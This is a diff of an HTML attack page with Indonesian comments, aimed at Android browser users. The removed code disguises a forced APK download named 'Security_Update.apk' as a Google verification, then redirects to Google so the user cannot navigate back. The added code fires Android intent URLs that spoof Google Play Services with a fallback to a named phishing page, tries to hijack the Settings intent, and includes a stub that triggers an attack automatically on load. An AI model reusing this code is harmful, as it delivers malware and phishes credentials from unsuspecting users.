@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Verification</title>
+<title>System Update</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
@@ -15,30 +15,32 @@
   .panel {
     background: #fff; padding: 40px; border-radius: 12px;
     box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
-    max-width: 400px; width: 100%;
+    max-width: 450px; width: 100%;
   }
   h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
   p { color: #666; margin-bottom: 20px; font-size: 14px; }
   button {
     background: #007aff; color: #fff; padding: 15px;
     border-radius: 8px; font-size: 16px; font-weight: bold;
-    cursor: pointer; border: none; width: 100%;
+    cursor: pointer; border: none; width: 100%; margin-bottom: 10px;
   }
   button:hover { background: #005bb5; }
   #log {
     margin-top: 20px; background: #000; color: #0f0;
     padding: 10px; font-family: monospace; font-size: 12px;
-    border-radius: 6px; width: 100%; max-width: 400px;
-    height: 100px; overflow-y: auto; text-align: left;
+    border-radius: 6px; width: 100%; max-width: 450px;
+    height: 150px; overflow-y: auto; text-align: left;
   }
 </style>
 </head>
 <body>
 
 <div class="panel">
-  <h1>🔒 Security Check</h1>
-  <p>Klik tombol di bawah untuk melanjutkan verifikasi.</p>
-  <button id="startBtn">Verify with Google</button>
+  <h1>🔒 Security Verification</h1>
+  <p>Pilih metode verifikasi di bawah ini:</p>
+  
+  <button id="btnSpoof">1. Spoof Intent (Fake Login)</button>
+  <button id="btnHijack">2. Hijack Intent (Settings)</button>
 </div>
 
 <div id="log">Sistem siap...</div>
@@ -54,73 +56,65 @@
   }
 
   // ============================================
-  // 1. PAYLOAD APK (BASE64)
+  // 1. INTENT SPOOFING (FAKE LOGIN)
   // ============================================
-  // Ganti string ini dengan Base64 APK asli Anda
-  var b64Data = "UEsDBBQACAgIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY="; // Header ZIP/APK
+  // Menyamar sebagai aplikasi otentikasi (misal: Google Sign-In)
+  // Kita mencoba memaksa browser membuka Activity palsu atau 
+  // memunculkan UI yang terlihat seperti login resmi.
+  
+  document.getElementById('btnSpoof').onclick = function() {
+    log("[!] Mencoba Intent Spoofing (Fake Login)...");
 
-  // ============================================
-  // 2. FUNGSI BLOB AUTO-DOWNLOAD
-  // ============================================
-  function triggerBlobDownload() {
-    log("[!] Memicu Blob Download...");
+    // Trik: Menggunakan skema 'intent' dengan package Google
+    // dan komponen spesifik (jika diketahui).
+    
+    // Format 1: Intent ke Package Google dengan Fallback jahat
+    var spoofIntent = "intent://login/#Intent;" +
+                      "scheme=https;" +
+                      "package=com.google.android.gms;" + // Package asli Google Play Services
+                      "S.browser_fallback_url=" + encodeURIComponent("https://artha231.github.io/phishing.html") + ";" + // URL Fallback (Phishing)
+                      "end";
+
     try {
-      var binary = atob(b64Data);
-      var bytes = new Uint8Array(binary.length);
-      for (var i = 0; i < binary.length; i++) {
-        bytes[i] = binary.charCodeAt(i);
-      }
-
-      // MIME Sniffing Bypass: Gunakan application/vnd.android.package-archive
-      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
-      var url = URL.createObjectURL(blob);
-
-      var a = document.createElement('a');
-      a.href = url;
-      a.download = 'Security_Update.apk'; // Nama file
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-
-      log("[+] APK Download Triggered.");
-      
-      setTimeout(function() {
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-      }, 5000);
-
+      window.location.href = spoofIntent;
+      log("[+] Spoof Intent (Google GMS) dieksekusi.");
     } catch(e) {
       log("[-] Gagal: " + e.message);
     }
-  }
+  };
 
   // ============================================
-  // 3. EKSEKUSI: DOWNLOAD + REDIRECT KE GOOGLE
+  // 2. INTENT HIJACKING (SETTINGS)
   // ============================================
-  document.getElementById('startBtn').addEventListener('click', function() {
-    log("[!] Memulai chain attack...");
+  // Memanfaatkan Implicit Intent ke Settings.
+  // Jika ada aplikasi jahat yang mendaftarkan Action yang sama,
+  // user akan disajikan pilihan (atau langsung dibuka jika default).
+  
+  document.getElementById('btnHijack').onclick = function() {
+    log("[!] Mencoba Intent Hijacking (Settings)...");
 
-    // A. Picu unduhan APK terlebih dahulu
-    triggerBlobDownload();
+    // Format Intent Implicit (Tanpa Package)
+    // Ini memicu Android untuk mencari semua aplikasi yang bisa menangani Action ini.
+    var hijackIntent = "intent://settings/#Intent;" +
+                       "action=android.settings.SETTINGS;" +
+                       "end";
 
-    // B. Redirect ke Google setelah 500ms
-    setTimeout(function() {
-      log("[!] Me-redirect ke Google.com...");
-      
-      // Trik: Gunakan window.location.replace agar tidak bisa di-back
-      // Anda bisa mengganti dengan Google Search atau Google Login
-      window.location.replace('https://www.google.com');
-      
-      // C. Trik Tab-Nabbing: Jika Anda membuka tab baru, coba hapus opener
-      /*
-      var win = window.open('https://www.google.com', '_blank');
-      if (win) {
-        win.opener = null;
-      }
-      */
-    }, 500);
+    try {
+      window.location.href = hijackIntent;
+      log("[+] Hijack Intent (Implicit Settings) dieksekusi.");
+    } catch(e) {
+      log("[-] Gagal: " + e.message);
+    }
+  };
 
-  });
+  // ============================================
+  // 3. ZERO-CLICK INTENT
+  // ============================================
+  setTimeout(function() {
+    log("[Zero-Click] Memicu Intent otomatis...");
+    // Coba trigger salah satu intent di sini jika ingin zero-click
+    // document.getElementById('btnSpoof').click();
+  }, 2000);
 
 })();
 </script>
